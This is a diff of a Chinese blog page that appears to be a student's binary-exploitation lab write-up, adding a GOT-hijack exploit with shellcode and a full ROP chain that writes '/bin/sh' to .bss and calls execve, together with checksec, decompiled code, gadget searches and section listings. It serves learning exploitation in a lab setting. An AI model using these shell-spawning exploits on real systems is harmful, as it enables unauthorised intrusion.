@@ -28,7 +28,7 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="http://example.com/img/cat.jpg">
 <meta property="article:published_time" content="2025-04-13T06:56:56.000Z">
-<meta property="article:modified_time" content="2025-04-16T01:47:55.024Z">
+<meta property="article:modified_time" content="2025-04-17T07:59:21.917Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="http://example.com/img/cat.jpg">
@@ -236,7 +236,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          1.1k 字
+          1.7k 字
         
       </span>
     
@@ -247,7 +247,7 @@
         
         
         
-          9 分钟
+          15 分钟
         
       </span>
     
@@ -349,12 +349,84 @@
 
 
 
+<h4 id="exp-2"><a href="#exp-2" class="headerlink" title="exp:"></a>exp:</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python3">from pwn import *<br><br>context(os = &#x27;linux&#x27;,arch = &#x27;amd64&#x27;,log_level = &#x27;debug&#x27; )<br><br>p = process(&#x27;./gothijack&#x27;)<br>#p = remote(&#x27;210.30.97.133&#x27;,28005)<br><br>p.recvuntil(b&#x27;?\n&#x27;)<br><br>sc = asm(shellcraft.sh())<br><br>p.send(sc)<br><br>p.recvuntil(b&#x27;?\n&#x27;)<br><br>puts_got_addr = 0x601018<br>printf_got_addr = 0x601028<br>name_addr = 0x601080<br><br>p.sendline(str(puts_got_addr))<br>#p.sendline(b&#x27;111111&#x27;)<br>pause()<br>p.recvuntil(b&#x27;: &#x27;)<br>p.send(p64(name_addr))<br>pause()<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<p><strong>但是Linux版本更新后，bss段无论开不开NX，它都没有可执行权限，后续打算patch一下改一下权限后重新让组长传上去再写</strong></p>
+<h3 id="Lab-5"><a href="#Lab-5" class="headerlink" title="Lab_5:"></a>Lab_5:</h3><h4 id="checksec-4"><a href="#checksec-4" class="headerlink" title="checksec:"></a>checksec:</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">briteny@localhost:/mnt/d/copy/Lab_5/Lab 5$ checksec rop<br>[*] &#x27;/mnt/d/copy/Lab_5/Lab 5/rop&#x27;<br>    Arch:       amd64-64-little<br>    RELRO:      Partial RELRO<br>    Stack:      Canary found<br>    NX:         NX enabled<br>    PIE:        No PIE (0x400000)<br>    Stripped:   No<br></code></pre></td></tr></table></figure>
 
 
 
+<h4 id="IDA-Pro-2"><a href="#IDA-Pro-2" class="headerlink" title="IDA_Pro:"></a>IDA_Pro:</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __fastcall <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">char</span> v4[<span class="hljs-number">16</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-10h] BYREF</span><br><br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;This is your first rop challenge ;)&quot;</span>, argv, envp);<br>  fflush(<span class="hljs-built_in">stdout</span>);<br>  read(<span class="hljs-number">0</span>, v4, <span class="hljs-number">0x90u</span>LL);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
 
-<h4 id="exp-2"><a href="#exp-2" class="headerlink" title="exp:"></a>exp:</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs"><br></code></pre></td></tr></table></figure>
 
+
+<p><strong>大致检查过后会发现没有后门函数，也没有可以写shellcode的部分，只能考虑构造rop链</strong></p>
+<h4 id="ROPgadget："><a href="#ROPgadget：" class="headerlink" title="ROPgadget："></a>ROPgadget：</h4><h5 id="pop-rdi-ret-addr"><a href="#pop-rdi-ret-addr" class="headerlink" title="pop_rdi_ret_addr:"></a>pop_rdi_ret_addr:</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">briteny@localhost:/mnt/d/copy/Lab_5/Lab 5$ ROPgadget --binary ./rop --only &#x27;pop|ret&#x27;| grep rdi<br>0x0000000000402575 : pop rdi ; pop rbp ; ret<br>0x0000000000400686 : pop rdi ; ret<br></code></pre></td></tr></table></figure>
+
+<h5 id="pop-rsi-ret-addr"><a href="#pop-rsi-ret-addr" class="headerlink" title="pop_rsi_ret_addr:"></a>pop_rsi_ret_addr:</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs assembly">briteny@localhost:/mnt/d/copy/Lab_5/Lab 5$ ROPgadget --binary ./rop --only &#x27;pop|ret&#x27;| grep rsi<br>0x000000000044ba39 : pop rdx ; pop rsi ; ret<br>0x0000000000402573 : pop rsi ; pop r15 ; pop rbp ; ret<br>0x0000000000400684 : pop rsi ; pop r15 ; ret<br>0x000000000040f7fe : pop rsi ; pop rbp ; ret<br>0x0000000000410093 : pop rsi ; ret<br>0x0000000000477b73 : pop rsi ; ret 2<br></code></pre></td></tr></table></figure>
+
+<h5 id="pop-rdx-ret-addr"><a href="#pop-rdx-ret-addr" class="headerlink" title="pop_rdx_ret_addr:"></a>pop_rdx_ret_addr:</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs assembly">briteny@localhost:/mnt/d/copy/Lab_5/Lab 5$ ROPgadget --binary ./rop --only &#x27;pop|ret&#x27;| grep rdx<br>0x0000000000481876 : pop rax ; pop rdx ; pop rbx ; ret<br>0x000000000044ba14 : pop rdx ; pop r10 ; ret<br>0x0000000000481877 : pop rdx ; pop rbx ; ret<br>0x000000000044ba39 : pop rdx ; pop rsi ; ret<br>0x000000000044ba16 : pop rdx ; ret<br></code></pre></td></tr></table></figure>
+
+<h5 id="syscall"><a href="#syscall" class="headerlink" title="syscall:"></a>syscall:</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs assembly">briteny@localhost:/mnt/d/copy/Lab_5/Lab 5$ ROPgadget --binary ./rop --only &#x27;syscall&#x27;<br>Gadgets information<br>============================================================<br>0x00000000004011fc : syscall<br><br>Unique gadgets found: 1<br></code></pre></td></tr></table></figure>
+
+<p><strong>当然ROPchain往往不止一种，肯定也有别的chain</strong></p>
+<h4 id="readelf："><a href="#readelf：" class="headerlink" title="readelf："></a>readelf：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs assembly">briteny@localhost:/mnt/d/copy/Lab_5/Lab 5$ readelf -S rop<br>There are 33 section headers, starting at offset 0xcdb58:<br><br>Section Headers:<br>  [Nr] Name              Type             Address           Offset<br>       Size              EntSize          Flags  Link  Info  Align<br>  [ 0]                   NULL             0000000000000000  00000000<br>       0000000000000000  0000000000000000           0     0     0<br>  [ 1] .note.ABI-tag     NOTE             0000000000400190  00000190<br>       0000000000000020  0000000000000000   A       0     0     4<br>  [ 2] .note.gnu.bu[...] NOTE             00000000004001b0  000001b0<br>       0000000000000024  0000000000000000   A       0     0     4<br>  [ 3] .rela.plt         RELA             00000000004001d8  000001d8<br>       0000000000000228  0000000000000018  AI       0    20     8<br>  [ 4] .init             PROGBITS         0000000000400400  00000400<br>       0000000000000017  0000000000000000  AX       0     0     4<br>  [ 5] .plt              PROGBITS         0000000000400418  00000418<br>       00000000000000b8  0000000000000000  AX       0     0     8<br>  [ 6] .text             PROGBITS         00000000004004d0  000004d0<br>       000000000008f680  0000000000000000  AX       0     0     16<br>  [ 7] __libc_freeres_fn PROGBITS         000000000048fb50  0008fb50<br>       0000000000001523  0000000000000000  AX       0     0     16<br>  [ 8] __libc_threa[...] PROGBITS         0000000000491080  00091080<br>       000000000000108f  0000000000000000  AX       0     0     16<br>  [ 9] .fini             PROGBITS         0000000000492110  00092110<br>       0000000000000009  0000000000000000  AX       0     0     4<br>  [10] .rodata           PROGBITS         0000000000492120  00092120<br>       000000000001928c  0000000000000000   A       0     0     32<br>  [11] .stapsdt.base     PROGBITS         00000000004ab3ac  000ab3ac<br>       0000000000000001  0000000000000000   A       0     0     1<br>  [12] .eh_frame         PROGBITS         00000000004ab3b0  000ab3b0<br>       000000000000a510  0000000000000000   A       0     0     8<br>  [13] .gcc_except_table PROGBITS         00000000004b58c0  000b58c0<br>       000000000000009e  0000000000000000   A       0     0     1<br>  [14] .tdata            PROGBITS         00000000006b6120  000b6120<br>       0000000000000020  0000000000000000 WAT       0     0     8<br>  [15] .tbss             NOBITS           00000000006b6140  000b6140<br>       0000000000000040  0000000000000000 WAT       0     0     8<br>  [16] .init_array       INIT_ARRAY       00000000006b6140  000b6140<br>       0000000000000010  0000000000000008  WA       0     0     8<br>  [17] .fini_array       FINI_ARRAY       00000000006b6150  000b6150<br>       0000000000000010  0000000000000008  WA       0     0     8<br>  [18] .data.rel.ro      PROGBITS         00000000006b6160  000b6160<br>       0000000000002d94  0000000000000000  WA       0     0     32<br>  [19] .got              PROGBITS         00000000006b8ef8  000b8ef8<br>       00000000000000f8  0000000000000000  WA       0     0     8<br>  [20] .got.plt          PROGBITS         00000000006b9000  000b9000<br>       00000000000000d0  0000000000000008  WA       0     0     8<br>  [21] .data             PROGBITS         00000000006b90e0  000b90e0<br>       0000000000001af0  0000000000000000  WA       0     0     32<br>  [22] __libc_subfreeres PROGBITS         00000000006babd0  000babd0<br>       0000000000000048  0000000000000000  WA       0     0     8<br>  [23] __libc_IO_vtables PROGBITS         00000000006bac20  000bac20<br>       00000000000006a8  0000000000000000  WA       0     0     32<br>  [24] __libc_atexit     PROGBITS         00000000006bb2c8  000bb2c8<br>       0000000000000008  0000000000000000  WA       0     0     8<br>  [25] __libc_threa[...] PROGBITS         00000000006bb2d0  000bb2d0<br>       0000000000000008  0000000000000000  WA       0     0     8<br>  [26] .bss              NOBITS           00000000006bb2e0  000bb2d8<br>       00000000000016f8  0000000000000000  WA       0     0     32<br>  [27] __libc_freer[...] NOBITS           00000000006bc9d8  000bb2d8<br>       0000000000000028  0000000000000000  WA       0     0     8<br>  [28] .comment          PROGBITS         0000000000000000  000bb2d8<br>       000000000000002a  0000000000000001  MS       0     0     1<br>  [29] .note.stapsdt     NOTE             0000000000000000  000bb304<br>       00000000000014cc  0000000000000000           0     0     4<br>  [30] .symtab           SYMTAB           0000000000000000  000bc7d0<br>       000000000000a950  0000000000000018          31   678     8<br>  [31] .strtab           STRTAB           0000000000000000  000c7120<br>       00000000000068c2  0000000000000000           0     0     1<br>  [32] .shstrtab         STRTAB           0000000000000000  000cd9e2<br>       0000000000000176  0000000000000000           0     0     1<br>Key to Flags:<br>  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),<br>  L (link order), O (extra OS processing required), G (group), T (TLS),<br>  C (compressed), x (unknown), o (OS specific), E (exclude),<br>  R (retain), D (mbind), l (large), p (processor specific)<br></code></pre></td></tr></table></figure>
+
+
+
+<p>对应我们要能写入”&#x2F;bin&#x2F;sh”的位置就是 .bss段 </p>
+<p><strong>如果存在一些.bss段上的变量，就最好不要从.bss段的首地址开始写，避免不必要的麻烦</strong></p>
+<h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp:"></a>exp:</h3><p><strong>由于并没哟‘’&#x2F;bin&#x2F;sh‘’字符，所以还需要添加一个写入‘’&#x2F;bin&#x2F;sh‘’字符的过程</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs shell">from pwn import *<br><br>context(os = &#x27;linux&#x27;,arch = &#x27;amd64&#x27;, log_level = &#x27;debug&#x27;)<br><br>p =remote(&#x27;210.30.97.133&#x27;,28046)<br><span class="hljs-meta prompt_">#</span><span class="language-bash">p = process(<span class="hljs-string">&#x27;./rop&#x27;</span>)</span><br><br>pop_rdi_ret_addr = 0x0000000000400686<br>pop_rsi_ret_addr = 0x0000000000410093<br>pop_rdx_ret_addr = 0x000000000044ba16<br>syscall_addr = 0x00000000004011fc<br>pop_rax_ret_addr = 0x0000000000415294<br>bss_addr = 0x00000000006bb2e0 #写入/bin/sh的地址<br>mov_binsh =  0x0000000000446c1b #写入地址的构造mov qword ptr [rdi], rsi ; ret<br><span class="hljs-meta prompt_">#</span><span class="language-bash">pop_rdx_pop_rsi_ret_addr = 0x000000000044ba39</span><br>offset = 16<br><br>pd1 = b&#x27;a&#x27; * ( offset + 8) + p64( pop_rdi_ret_addr ) + p64( bss_addr ) + p64( pop_rsi_ret_addr ) + b&#x27;/bin/sh\x00&#x27; + p64( mov_binsh ) + p64( pop_rsi_ret_addr ) + p64( 0x0 ) + p64( pop_rdx_ret_addr ) + p64( 0x0 ) + p64( pop_rax_ret_addr ) + p64( 0x3b ) + p64( syscall_addr )<br><br>p.recvuntil(b&#x27;)&#x27;)<br><br>p.send(pd1)<br><span class="hljs-meta prompt_">#</span><span class="language-bash">pause()</span><br><br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+
+
+<h4 id="stack："><a href="#stack：" class="headerlink" title="stack："></a>stack：</h4><table>
+<thead>
+<tr>
+<th align="center"></th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center"></td>
+</tr>
+<tr>
+<td align="center"></td>
+</tr>
+<tr>
+<td align="center"></td>
+</tr>
+<tr>
+<td align="center"></td>
+</tr>
+<tr>
+<td align="center"></td>
+</tr>
+<tr>
+<td align="center"></td>
+</tr>
+<tr>
+<td align="center"></td>
+</tr>
+<tr>
+<td align="center"></td>
+</tr>
+<tr>
+<td align="center"></td>
+</tr>
+<tr>
+<td align="center"></td>
+</tr>
+<tr>
+<td align="center"></td>
+</tr>
+<tr>
+<td align="center"></td>
+</tr>
+<tr>
+<td align="center"></td>
+</tr>
+</tbody></table>
 
                 
               </div>
